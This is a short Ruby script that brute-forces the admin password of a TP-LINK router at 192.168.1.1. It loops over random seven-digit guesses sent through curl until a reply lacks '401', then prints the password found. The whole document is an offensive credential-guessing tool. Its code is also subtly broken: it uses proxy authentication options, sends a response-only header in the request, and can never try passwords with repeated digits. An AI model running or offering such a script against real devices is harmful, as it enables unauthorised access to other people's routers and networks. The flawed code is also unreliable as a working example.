while true
    pwd=('0'..'9').to_a.shuffle[0..6].join
    puts "Attempting password #{pwd}"
    r=`curl -s --proxy-user admin:#{pwd} -H "Server: Router" -H 'WWW-Authenticate: Basic realm="TP-LINK Wireless Router WR340G"'  192.168.1.1 `
    unless r.include? '401'
        pass=pwd
        puts "Success ,found password #{pass}!"
        puts r
        break
    end

end
